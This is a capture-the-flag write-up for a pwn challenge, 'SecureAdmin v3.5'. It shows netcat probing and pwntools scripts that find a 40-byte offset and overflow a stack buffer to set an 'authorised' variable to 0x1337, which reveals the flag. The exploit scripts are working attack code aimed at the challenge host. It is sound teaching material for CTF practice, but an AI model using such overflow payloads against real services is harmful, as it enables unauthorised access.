# SecureAdmin v3.5 - CTF Writeup

**Challenge Name:** SecureAdmin v3.5
**Category:** PWN
**Points:** 50


![](attachments/Pasted%20image%2020251130123913.png)

---

## Initial Reconnaissance

### Connecting to the Service

First, let's connect to the service and observe its behavior:

```bash
$ nc 38.60.200.116 9001
Welcome to SecureAdmin v2.0
Debug info: 0x7ffe55a8aca0
Enter admin password:
```

**Key Observations:**
1. The service reports itself as "SecureAdmin v2.0" (not v3.5 as in the challenge title)
2. A **debug info leak** is provided - this looks like a stack address (`0x7ffe...` is typical for x86-64 stack addresses)
3. It prompts for an admin password

### Testing Basic Input

Let's test with a simple password:

```bash
$ echo "test" | nc 38.60.200.116 9001
Welcome to SecureAdmin v2.0
Debug info: 0x7ffde14e1ab0
Enter admin password:
Incorrect Password!
Access denied (authorised=0, decoy=-559038737)

This is just a decoy, nothing happens here.
```

**Important Information Revealed:**
- Two variables are displayed: `authorised=0` and `decoy=-559038737`
- The message "This is just a decoy, nothing happens here" suggests misdirection
- The decoy value `-559038737` is suspicious

---

## Vulnerability Analysis

### Identifying the Buffer Overflow

Let's test with a longer input to see if we can overflow the buffer:

```bash
$ python3 -c "print('A' * 100)" | nc 38.60.200.116 9001
Welcome to SecureAdmin v2.0
Debug info: 0x7ffc026c0b50
Enter admin password:
Incorrect Password!
Access denied (authorised=1094795585, decoy=1094795585)

This is just a decoy, nothing happens here.
```

**Success!** Both variables have been overwritten:
- `authorised=1094795585` = `0x41414141` = "AAAA"
- `decoy=1094795585` = `0x41414141` = "AAAA"

This confirms a **stack buffer overflow vulnerability**.

### Finding the Exact Offset

Using a systematic approach to find the exact offset to the `authorised` variable:

```python
#!/usr/bin/env python3
from pwn import *

for offset in range(0, 150, 4):
    io = remote('38.60.200.116', 9001)
    io.recvuntil(b'Enter admin password: ')

    payload = b'A' * offset + p32(0x41424344)
    io.sendline(payload)

    response = io.recvall(timeout=1).decode(errors='ignore')
    if 'authorised=' in response:
        auth_str = response.split('authorised=')[1].split(',')[0]
        if int(auth_str) == 0x41424344:
            print(f"[+] Found offset: {offset}")
            break
    io.close()
```

**Result:** The offset to `authorised` is **40 bytes**.

### Analyzing the Decoy Value

The decoy value `-559038737` is interesting. Let's analyze it:

```python
>>> hex(-559038737 & 0xFFFFFFFF)
'0xdeadbeef'
```

The decoy is initialized to **0xDEADBEEF** - a classic magic value in computing!

**Stack Layout:**
```
[Buffer - 40 bytes]
[authorised - 4 bytes]  <- offset 40
[decoy - 4 bytes]       <- offset 44 (initialized to 0xDEADBEEF)
[... rest of stack ...]
```

---

## Exploitation Strategy

### Initial Attempts

My first attempts focused on:
1. **Shellcode injection** - Tried using the leaked stack address to execute shellcode
2. **Return-to-libc** - Attempted to overwrite return addresses
3. **ROP chains** - Tried building ROP gadgets

**All failed!** The program always printed the "decoy" message regardless.

### The Breakthrough

The key insight came from testing **magic values** for the `authorised` variable. Common CTF magic numbers include:
- `0x1337` (leet)
- `0xDEADC0DE`
- `0xCAFEBABE`
- `0xDEADBEEF`

### Testing Magic Values

```python
#!/usr/bin/env python3
from pwn import *

magic_values = [0x1, 0x1337, 0xDEADC0DE, 0xCAFEBABE]

for auth_val in magic_values:
    io = remote('38.60.200.116', 9001)
    io.recvuntil(b'Enter admin password: ')

    payload = b'A' * 40                          # Fill to authorised
    payload += p32(auth_val, sign='unsigned')    # Set authorised
    payload += p32(0xDEADBEEF, sign='unsigned')  # Preserve decoy

    io.sendline(payload)
    response = io.recvall(timeout=1).decode()

    if 'NOVA_CTF' in response:
        print(f"FLAG FOUND with authorised={hex(auth_val)}!")
        print(response)
        break

    io.close()
```


## Solution

### The Winning Payload

```python
#!/usr/bin/env python3
from pwn import *

io = remote('38.60.200.116', 9001)
io.recvuntil(b'Enter admin password: ')

# Craft the payload
payload = b'A' * 40                          # Padding to reach authorised variable
payload += p32(0x1337, sign='unsigned')      # Set authorised = 0x1337 (magic value!)
payload += p32(0xDEADBEEF, sign='unsigned')  # Preserve decoy = 0xDEADBEEF

io.sendline(payload)
response = io.recvall(timeout=2).decode()

print(response)
io.close()
```

## The Result

```
python3 get_flag.py 
[+] Opening connection to 38.60.200.116 on port 9001: Done
[+] Receiving all data: Done (194B)
[*] Closed connection to 38.60.200.116 port 9001

Incorrect Password!
Access granted (authorised=4919)
Congrats player! You found the hidden backdoor!
NOVA_CTF{tr1cky_5t4ck_buff3r_0v3rfl0w_m4st3r3d}
This is just a decoy, nothing happens here.
```

## Flag

`NOVA_CTF{tr1cky_5t4ck_buff3r_0v3rfl0w_m4st3r3d}`


![](attachments/Pasted%20image%2020251130124644.png)

